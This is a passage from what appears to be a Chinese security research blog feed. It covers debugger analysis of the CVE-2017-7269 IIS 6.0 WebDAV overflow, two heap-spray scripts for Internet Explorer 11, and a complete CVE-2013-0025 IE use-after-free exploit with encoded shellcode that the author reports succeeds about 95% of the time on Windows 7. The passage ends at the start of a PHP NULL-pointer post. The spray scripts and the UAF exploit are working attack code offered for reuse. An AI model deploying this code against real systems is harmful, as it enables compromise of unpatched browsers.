<p>访问IIS6.0搭建的网站后产生wswp.exe的进程，利用windbg工具附加进程，再运行poc代码，会触发异常。<br> <img src="https://raw.githubusercontent.com/whiteHat001/cve-2017-7269picture/master/1.png" alt="picture"><br>这里的值为什么会变成00410041这样呢，可能是经过前面转化为unicode字符了，利用ub命令查看前面的反汇编代码，然后重新附加调试，在httpext!ScStoragePathFromUrl+0x343这个位置下一个断点。<br> <img src="https://raw.githubusercontent.com/whiteHat001/cve-2017-7269picture/master/2.png" alt="picture1"><br>   在重新附加下调试后，会断在断点处，从上面的图已经知道esi来源于ebp-444h，单步执行查看数据即可。<br>  <img src="https://raw.githubusercontent.com/whiteHat001/cve-2017-7269picture/master/3.png" alt="picture2"></p>
<p>单步执行下去，观察到ecx的值为0x4664就是我们拷贝的数据的大小，<br> <img src="https://raw.githubusercontent.com/whiteHat001/cve-2017-7269picture/master/4.png" alt="picture3"><br>然后按g命令执行到断点处，查看数据。观察到数据只有复制到0x02012fff。<br> <img src="https://raw.githubusercontent.com/whiteHat001/cve-2017-7269picture/master/5.png" alt="picture4"><br>最后可以计算缓冲区的大小，远远小于0x4664这个值，所以造成了拷贝的缓冲区溢出。<br><img src="https://raw.githubusercontent.com/whiteHat001/cve-2017-7269picture/master/6.png" alt="picture5"><br>再进行细致的分析一下了，先看这个函数的伪代码。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div></pre></td><td class="code"><pre><div class="line">signed int __fastcall ScStoragePathFromUrl(int a1, wchar_t *a2, unsigned __int16 *a3, int a4, int a5)</div><div class="line">&#123;</div><div class="line">......  </div><div class="line">result = ScStripAndCheckHttpPrefix((const struct IEcb *)a1, (const unsigned __int16 **)&amp;Str);// 这里检查http前缀等信息</div><div class="line">  if ( result &lt; 0 )</div><div class="line">    return result;</div><div class="line">  if ( *Str != 47 )</div><div class="line">    return -2146107135;</div><div class="line">  v7 = _wcslen(Str); // 计算宽字节的长度</div><div class="line">  result=IEcbBase::ScReqMapUrlToPathEx((IEcbBase*)v5,Str,(struct_HSE_UNICODE_URL_MAPEX_INFO *)v40);// 这里将url该为本地路径格式</div><div class="line">  v36 = result;</div><div class="line">……</div><div class="line">else</div><div class="line">  &#123;</div><div class="line">    v21 = v35;</div><div class="line">    v22 = v16;</div><div class="line">    v23 = 2 * v16;</div><div class="line">    v24 = (unsigned int)(2 * v16) &gt;&gt; 2;</div><div class="line">    qmemcpy(v35, v40, 4 * v24);  //将本地字符串拷贝过去</div><div class="line">    v26 = &amp;v40[4 * v24];</div><div class="line">    v25 = &amp;v21[2 * v24];</div><div class="line">    LOBYTE(v24) = v23;</div><div class="line">    v27 = v42;</div><div class="line">    qmemcpy(v25, v26, v24 &amp; 3);</div><div class="line">    v28 = v7 - v27;</div><div class="line">    v29 = &amp;Str[v27];</div><div class="line">    v30 = v35;</div><div class="line">    qmemcpy(&amp;v35[v22], v29, 2 * v28 + 2); //这里拷贝剩下的字符串</div><div class="line">    for ( i = (int)&amp;v30[v41]; *(_WORD *)i; i += 2 )</div><div class="line">    &#123;</div><div class="line">      if ( *(_WORD *)i == 47 )</div><div class="line">        *(_WORD *)i = 92;</div><div class="line">    &#125;</div><div class="line">    *(_DWORD *)v34 = v37;</div><div class="line">    result = v36;</div><div class="line">  &#125;</div><div class="line">  return result;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个函数调用了好几次，第一次调用的时候没有进入拷贝区</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div></pre></td><td class="code"><pre><div class="line">0:009&gt; p</div><div class="line">eax=00002344 ebx=00002331 ecx=0130f800 edx=00080000 esi=00000012 edi=0130f37e</div><div class="line">eip=673f6f4d esp=0130f330 ebp=0130f798 iopl=0         nv up ei pl nz na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</div><div class="line">httpext!ScStoragePathFromUrl+0x2d2:</div><div class="line">673f6f4d 3901            cmp     dword ptr [ecx],eax  ds:0023:0130f800=00000082</div><div class="line">0:009&gt; p</div><div class="line">eax=00002344 ebx=00002331 ecx=0130f800 edx=00080000 esi=00000012 edi=0130f37e</div><div class="line">eip=673f6f4f esp=0130f330 ebp=0130f798 iopl=0         nv up ei ng nz ac po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293</div><div class="line">httpext!ScStoragePathFromUrl+0x2d4:</div><div class="line">673f6f4f 8985b8fbffff    mov     dword ptr [ebp-448h],eax ss:0023:0130f350=01f058f0</div><div class="line">0:009&gt; dc ecx</div><div class="line">0130f800  00000082 00000000 00000000 00000000  ................</div><div class="line">0130f810  000001d5 0130fa40 7c95a656 01f00000  ....@.0.V..|....</div><div class="line">0130f820  0130f860 00000058 01f00660 01f00650  `.0.X...`...P...</div><div class="line">0130f830  0000012b 0130fa60 00000000 01f00000  +...`.0.........</div><div class="line">0130f840  00000000 00000001 00000016 01f00650  ............P...</div><div class="line">0130f850  00000000 000af064 01f0c2b8 00000000  ....d...........</div><div class="line">0130f860  8a885d04 0000006c 56b91e8c 56b91e82  .]..l......V...V</div><div class="line">0130f870  00000002 56b91e9a 0130fb34 00000033  .......V4.0.3...</div><div class="line">0:009&gt; p</div><div class="line">eax=00002344 ebx=00002331 ecx=0130f800 edx=00080000 esi=00000012 edi=0130f37e</div><div class="line">eip=673f6f55 esp=0130f330 ebp=0130f798 iopl=0         nv up ei ng nz ac po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293</div><div class="line">httpext!ScStoragePathFromUrl+0x2da:</div><div class="line">673f6f55 7342            jae     httpext!ScStoragePathFromUrl+0x31e (673f6f99) [br=0]</div><div class="line">0:009&gt; p</div><div class="line">eax=00002344 ebx=00002331 ecx=0130f800 edx=00080000 esi=00000012 edi=0130f37e</div><div class="line">eip=673f6f57 esp=0130f330 ebp=0130f798 iopl=0         nv up ei ng nz ac po cy</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000293</div><div class="line">httpext!ScStoragePathFromUrl+0x2dc:</div><div class="line">673f6f57 8901            mov     dword ptr [ecx],eax  ds:0023:0130f800=00000082</div></pre></td></tr></table></figure>
<p>看到上面调试信息没有跳转。第二次或者第三次的时候跳转过去进行拷贝了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div></pre></td><td class="code"><pre><div class="line">0:009&gt; p</div><div class="line">eax=00002344 ebx=00002331 ecx=0130f800 edx=00080000 esi=00000012 edi=0130f37e</div><div class="line">eip=673f6f4d esp=0130f330 ebp=0130f798 iopl=0         nv up ei pl nz na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000206</div><div class="line">httpext!ScStoragePathFromUrl+0x2d2:</div><div class="line">673f6f4d 3901            cmp     dword ptr [ecx],eax  ds:0023:0130f800=00002344</div><div class="line">0:009&gt; p</div><div class="line">eax=00002344 ebx=00002331 ecx=0130f800 edx=00080000 esi=00000012 edi=0130f37e</div><div class="line">eip=673f6f4f esp=0130f330 ebp=0130f798 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">httpext!ScStoragePathFromUrl+0x2d4:</div><div class="line">673f6f4f 8985b8fbffff    mov     dword ptr [ebp-448h],eax ss:0023:0130f350=01f058f0</div><div class="line">0:009&gt; p</div><div class="line">eax=00002344 ebx=00002331 ecx=0130f800 edx=00080000 esi=00000012 edi=0130f37e</div><div class="line">eip=673f6f55 esp=0130f330 ebp=0130f798 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">httpext!ScStoragePathFromUrl+0x2da:</div><div class="line">673f6f55 7342            jae     httpext!ScStoragePathFromUrl+0x31e (673f6f99) [br=1]</div><div class="line">0:009&gt; p</div><div class="line">eax=00002344 ebx=00002331 ecx=0130f800 edx=00080000 esi=00000012 edi=0130f37e</div><div class="line">eip=673f6f99 esp=0130f330 ebp=0130f798 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">httpext!ScStoragePathFromUrl+0x31e:</div><div class="line">673f6f99 8bbdb0fbffff    mov     edi,dword ptr [ebp-450h] ss:0023:0130f348=0208f810</div><div class="line">0:009&gt; p</div><div class="line">eax=00000024 ebx=00002331 ecx=00000000 edx=00000000 esi=0130f380 edi=0208f834</div><div class="line">eip=673f6fbc esp=0130f330 ebp=0130f798 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">httpext!ScStoragePathFromUrl+0x341:</div><div class="line">673f6fbc f3a4            rep movs byte ptr es:[edi],byte ptr [esi]</div><div class="line">0:009&gt; dc edi</div><div class="line">01fcf834  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf844  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf854  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf864  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf874  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf884  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf894  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf8a4  00000000 00000000 00000000 00000000  ................</div><div class="line">0:009&gt; dc esi</div><div class="line">0130f35c  003a0063 0069005c 0065006e 00700074  c.:.\.i.n.e.t.p.</div><div class="line">0130f36c  00620075 0077005c 00770077 006f0072  u.b.\.w.w.w.r.o.</div><div class="line">0130f37c  0074006f 0061005c 00610061 00610061  o.t.\.a.a.a.a.a.</div><div class="line">0130f38c  00610061 00410041 00410041 00410041  a.a.A.A.A.A.A.A.</div><div class="line">0130f39c  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0130f3ac  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0130f3bc  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0130f3cc  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0:009&gt; p</div><div class="line">eax=00000024 ebx=00002331 ecx=00000000 edx=00000000 esi=0130f380 edi=0208f834</div><div class="line">eip=673f6fbe esp=0130f330 ebp=0130f798 iopl=0         nv up ei pl zr na pe nc</div><div class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246</div><div class="line">httpext!ScStoragePathFromUrl+0x343:</div><div class="line">673f6fbe 8bb5bcfbffff    mov     esi,dword ptr [ebp-444h] ss:0023:0130f354=020823d8</div><div class="line">0:009&gt; dc esi    </div><div class="line">0130f380  0061005c 00610061 00610061 00610061  \.a.a.a.a.a.a.a.</div><div class="line">0130f390  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0130f3a0  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0130f3b0  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0130f3c0  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0130f3d0  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0130f3e0  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</div><div class="line">0:009&gt; dc edi-0x24   //这里将本地路径拷贝过去了。</div><div class="line">01fcf810  003a0063 0069005c 0065006e 00700074  c.:.\.i.n.e.t.p.</div><div class="line">01fcf820  00620075 0077005c 00770077 006f0072  u.b.\.w.w.w.r.o.</div><div class="line">01fcf830  0074006f 00000000 00000000 00000000  o.t.............</div><div class="line">01fcf840  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf850  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf860  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf870  00000000 00000000 00000000 00000000  ................</div><div class="line">01fcf880  00000000 00000000 00000000 00000000  ................</div></pre></td></tr></table></figure></p>
<p>后面的拷贝就是开头那一次所讲的。这个漏洞是我第一次自己分析，有些地方还不是很明白，相信以后知识深了，就能够 更深入了。还有一开始没注意GS机制，一直想覆盖ret地址，最后才发现问题。这个漏洞我觉得k0大牛分析的挺详细，挺深入的，可以网上搜下。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[HeapLib2 Heap Spray脚本]]></title>
      <url>http://yoursite.com/2017/03/24/HeapLib2-Heap-Spray%E8%84%9A%E6%9C%AC/</url>
      <content type="html"><![CDATA[<p>IE 11下Heaplib2方法喷射正常<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line"></div><div class="line">&lt;head&gt;</div><div class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;heapLib2.js&quot;&gt;&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;h1 id=&quot;wonk&quot; data-wonk=&quot;wonky&quot;&gt;honk&lt;/h1&gt;</div><div class="line"></div><div class="line">&lt;script type=&quot;text/javascript&quot;&gt;</div><div class="line">    var obj = document.getElementById(&quot;wonk&quot;);</div><div class="line">            </div><div class="line">    //Create a heapLib2 object for Internet Explorer    </div><div class="line">    var heap = new heapLib2.ie(obj, 0x80000); </div><div class="line">     var code = unescape(&quot;%ucccc&quot;);</div><div class="line">     while(code.length&lt;400) code += code;</div><div class="line">    code  = code.substring(0,400);</div><div class="line"> var rop = unescape(&quot;%u4141%u4141%u4242%u4242%u4343%u4343%u4444%u4444%u4545%u4545%u4646%u4646%u4747%u4747%u4848%u4848&quot;);</div><div class="line"> var pad = unescape(&quot;%u9090%u9090&quot;);</div><div class="line"> while (pad.length &lt; 0x1000) pad += pad;</div><div class="line"></div><div class="line"> offset_length = 0x5E6;</div><div class="line"> junk_offset = pad.substring(0, offset_length);</div><div class="line"></div><div class="line"> var shellcode = junk_offset + rop + code + pad.substring(0, 0x800 - code.length - junk_offset.length - rop.length);</div><div class="line"> while (shellcode.length &lt; 0x40000) shellcode += shellcode;</div><div class="line"> var block = shellcode.substring(2, 0x40000 - 0x21);</div><div class="line">    for (var i = 0; i &lt; 0x500; i++)&#123;</div><div class="line">            //this will bypass the cache allocator</div><div class="line">            heap.sprayalloc(&quot;big_attr&quot;+i, block); </div><div class="line">    &#125;</div><div class="line">    heap.free(&quot;big_attr0&quot;);</div><div class="line">    alert(&quot;HeapLib2 done&quot;);</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/body&gt;</div><div class="line"></div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[IE 11 Heap Spray脚本]]></title>
      <url>http://yoursite.com/2017/03/20/IE-11-Heap-Spray%E8%84%9A%E6%9C%AC/</url>
      <content type="html"><![CDATA[<p>由于网上找不到IE最新版本的堆喷射脚本，自己查找资料找到，稍微改了下，win7 sp1 IE 11 亲测可用。</p>
<p>html5堆喷射脚本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=Edge;chrome=1&quot;&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;script&gt;</div><div class="line">  var memory=Array();</div><div class="line">  function fill(imgd,payload)&#123;</div><div class="line">     for(var i=0;i&lt;=imgd.data.length;i++)&#123;</div><div class="line">	    imgd.data[i]=payload[i%payload.length];</div><div class="line">	 </div><div class="line">	 &#125;;</div><div class="line">  </div><div class="line">  &#125;;</div><div class="line">  </div><div class="line">  window.onload=function()&#123;</div><div class="line">      var payload=[0x0c,0x0c,0x0c,0x0c];</div><div class="line">	  for(var i=0;i&lt;500;i++)&#123;</div><div class="line">	    var elem=document.createElement(&apos;canvas&apos;);</div><div class="line">		elem.width=256;</div><div class="line">		elem.height=256;</div><div class="line">		var context=elem.getContext(&apos;2d&apos;);</div><div class="line">		var imgd=context.createImageData(256,256);</div><div class="line">		fill(imgd,payload);</div><div class="line">		memory[i]=imgd;</div><div class="line">	  &#125;</div><div class="line">	  &#125;</div><div class="line">	  alert(&apos;Spray Done&apos;);</div><div class="line">  &lt;/script&gt;</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[CVE-2013-0025 IE UAF漏洞]]></title>
      <url>http://yoursite.com/2017/03/10/CVE-2013-0025-IE-UAF%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p> 首先说明一点，我在浏览器溢出方面的知识挺浅薄的，这次的漏洞分析网上也早就有了，我就不分析了，漏洞根本原因，我也不是很清楚，然后漏洞利用我也只是根据别人的技术文章改的。</p>
<h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>POC这种东西我就不放了，下面的参考链接都有。<br>直接放exp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div></pre></td><td class="code"><pre><div class="line">&lt;!doctype html&gt;</div><div class="line">&lt;html&gt;</div><div class="line">&lt;head&gt;</div><div class="line">&lt;script&gt;</div><div class="line"></div><div class="line">  function alloc(bytes,mystr)&#123;</div><div class="line">  	while(mystr.length&lt;bytes) mystr+=mystr;</div><div class="line">  	return mystr.substr(0,(bytes-6)/2);</div><div class="line">  &#125;</div><div class="line">  block_size=0x1000;</div><div class="line">  padding_size=0x666/2;</div><div class="line">  Padding=&apos;&apos;;</div><div class="line">  NopSlide=&apos;&apos;;</div><div class="line">  var Shellcode=unescape(&apos;%uebd9%ud99b%u2474%u31f4%ub2d2%u3177%u64c9%u718b%u8b30%u0c76%u768b%u8b1c%u0846%u7e8b%u8b20%u3836%u184f%uf375%u0159%uffd1%u60e1%u6c8b%u2424%u458b%u8b3c%u2854%u0178%u8bea%u184a%u5a8b%u0120%ue3eb%u4934%u348b%u018b%u31ee%u31ff%ufcc0%u84ac%u74c0%uc107%u0dcf%uc701%uf4eb%u7c3b%u2824%ue175%u5a8b%u0124%u66eb%u0c8b%u8b4b%u1c5a%ueb01%u048b%u018b%u89e8%u2444%u611c%ub2c3%u2908%u89d4%u89e5%u68c2%u4e8e%uec0e%ue852%uff9f%uffff%u4589%ubb04%ud87e%u73e2%u1c87%u5224%u8ee8%uffff%u89ff%u0845%u6c68%u206c%u6841%u3233%u642e%u7568%u6573%u3072%u88db%u245c%u890a%u56e6%u55ff%u8904%u50c2%ua8bb%u4da2%u87bc%u241c%ue852%uff5f%uffff%u6f68%u2058%u6820%u6568%u6c6c%udb31%u5c88%u0524%ue389%u6868%u5821%u6820%u6b63%u7a79%u7968%u6820%u6861%u6465%u6220%u6868%u6361%u316b%u88c9%u244c%u8912%u31e1%u52d2%u5153%uff52%u31d0%u50c0%u55ff%u4108&apos;);</div><div class="line">  for(p=0;p&lt;padding_size;p++)&#123;</div><div class="line">  	Padding+=unescape(&apos;%u0cf0%u0c0c&apos;);</div><div class="line">  &#125;</div><div class="line">  for(c=0;c&lt;block_size;c++)&#123;</div><div class="line">  	NopSlide+=unescape(&apos;%u9090&apos;);</div><div class="line">  &#125;</div><div class="line">  NopSlide=NopSlide.substring(0,block_size-(Shellcode.length+Padding.length));</div><div class="line">  var OBJECT=Padding+Shellcode+NopSlide;</div><div class="line">  OBJECT=alloc(0xfffe0,OBJECT);</div><div class="line">  var evil=new Array();</div><div class="line">  for(var k=0;k&lt;150;k++)&#123;</div><div class="line">  	evil[k]=OBJECT.substr(0,OBJECT.length);</div><div class="line">  &#125;</div><div class="line"></div><div class="line"> var data;</div><div class="line"> var objArray=new Array(1150);</div><div class="line"> setTimeout(function()&#123;</div><div class="line"> document.body.style.whiteSpace=&quot;pre-line&quot;;</div><div class="line"> for(var i=0;i&lt;1150;i++)&#123;</div><div class="line">  objArray[i]=document.createElement(&apos;div&apos;);</div><div class="line">  objArray[i].className=data+=unescape(&quot;%u0c0c%u0c0c&quot;);</div><div class="line">  &#125; //这里占据释放的部分</div><div class="line">  setTimeout(function()&#123;document.body.innerHTML=&quot;boo&quot;&#125;,100)&#125;,100)</div><div class="line">&lt;/script&gt;</div><div class="line">&lt;/head&gt;</div><div class="line">&lt;body&gt;</div><div class="line">&lt;p&gt; &lt;/p&gt;  //这里的空格很必要</div><div class="line">&lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure></p>
<p>这个漏洞我在win7和xp下实验了下，xp下不是很稳定，win7的成功率95%,根据那篇文章的喷射我到最后的时候进行函数调用的位置变成0x0c0c0c7c，这里正好处在shellcode下面部分了，所以我将它改成了更高的位置，这样的成功率变大了。</p>
<p><img src="https://raw.githubusercontent.com/whiteHat001/AllPicture/master/exploit.png" alt="avatar"></p>
<h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>终于在win7下利用成功了，不过没能用rop绕过dep，不知道为啥执行不了，看来还是需要多学习学习。最近发现特别热爱学习了。每时每刻都想学习到技术。</p>
<p>参考链接<br><a href="http://www.2cto.com/article/201303/196178.html" target="_blank" rel="external">http://www.2cto.com/article/201303/196178.html</a><br><a href="http://bobao.360.cn/learning/detail/3555.html" target="_blank" rel="external">http://bobao.360.cn/learning/detail/3555.html</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[HTML5沙盒绕过(翻译)]]></title>
      <url>http://yoursite.com/2017/03/07/HTML5%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87-%E7%BF%BB%E8%AF%91/</url>
      <content type="html"><![CDATA[<p>可以移步到看雪论坛观赏，地址 <a href="http://bbs.pediy.com/thread-216185.htm" target="_blank" rel="external">http://bbs.pediy.com/thread-216185.htm</a><br>有可能很多地方会有问题，语句不通顺之类的，请在看雪论坛留言。</p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[汽车黑客手册(翻译)by hackyzh]]></title>
      <url>http://yoursite.com/2017/03/05/%E6%B1%BD%E8%BD%A6%E9%BB%91%E5%AE%A2%E6%89%8B%E5%86%8C-%E7%BF%BB%E8%AF%91/</url>
      <content type="html"><![CDATA[<p>由于markdown不太好排版，所以只好放在word文档里面，翻译这些文章，只是兴趣使然，没有别的意思。由于英文水平有限，麻烦看到错误请指出谢谢！后面可能会继续翻译下去。</p>
<p>第一章地址：<a href="https://github.com/whiteHat001/Car-Hacker-s-Handbook--" target="_blank" rel="external">https://github.com/whiteHat001/Car-Hacker-s-Handbook--</a></p>
]]></content>
    </entry>
    
    <entry>
      <title><![CDATA[NULL Pointer Dereference]]></title>
      <url>http://yoursite.com/2017/02/19/NULL-Pointer-Dereference/</url>
      <content type="html"><![CDATA[<h1 id="NULL-pointer-dereference-php漏洞挖掘系列四"><a href="#NULL-pointer-dereference-php漏洞挖掘系列四" class="headerlink" title="NULL pointer dereference (php漏洞挖掘系列四)"></a>NULL pointer dereference (php漏洞挖掘系列四)</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>本次要讲的是空指针漏洞，php官方把空指针漏洞算安全漏洞，有些空指针漏洞会申报cve的，不过我也不太清楚它将哪些空指针漏洞上报cve，好了开始分享本次漏洞吧，这个漏洞案例有些地方我也不是很清楚，那个上报漏洞人有些地方讲解的地方不是很清楚，我自己水平有限，欢迎清楚的朋友指点指点。</p>
<h2 id="0x02-漏洞分析"><a href="#0x02-漏洞分析" class="headerlink" title="0x02 漏洞分析"></a>0x02 漏洞分析</h2><p>首先放顶层函数代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div 